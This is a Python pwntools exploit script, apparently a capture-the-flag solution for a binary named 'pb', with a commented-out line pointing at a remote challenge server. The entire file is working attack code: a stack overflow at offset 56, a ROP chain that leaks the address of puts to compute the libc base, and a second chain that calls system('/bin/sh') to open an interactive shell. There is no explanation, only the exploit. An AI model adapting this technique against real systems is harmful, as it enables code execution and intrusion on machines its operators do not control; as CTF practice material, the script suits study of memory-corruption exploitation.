from pwn import *

f = './pb'
elf = context.binary = ELF(f, checksec=False)
io = process(f)
#io = remote('159.65.62.153', 30930)

offset = 56

pop_rdi = 0x40142b # ropper --file pb --search "pop rdi"
ret = 0x4013a5

# payload to leak libc base address
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.box
    ]
})

io.recvuntil(b'>> ')
io.sendline(b'2')
io.recvuntil(b'ry: ')
io.sendline(payload)
io.recvlines(3)
got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
info("leaked got_puts: %#x", got_puts)

libc_base = got_puts - 0x080ed0 # readelf -s ./glibc/libc.so.6 | grep puts
info("libc base: %#x", libc_base)

system = libc_base + 0x050d60 # readelf -s ./glibc/libc.so.6 | grep system
binsh = libc_base + 0x1d8698 # strings -a -t x ./glibc/libc.so.6 | grep "/bin/sh"

# payload to call system("/bin/sh")
payload = flat({
    offset: [
        ret,
        pop_rdi,
        binsh,
        system
    ]
})

io.sendline(b'2')
io.recvuntil(b'ry: ')
io.sendline(payload)
io.interactive()
io.close()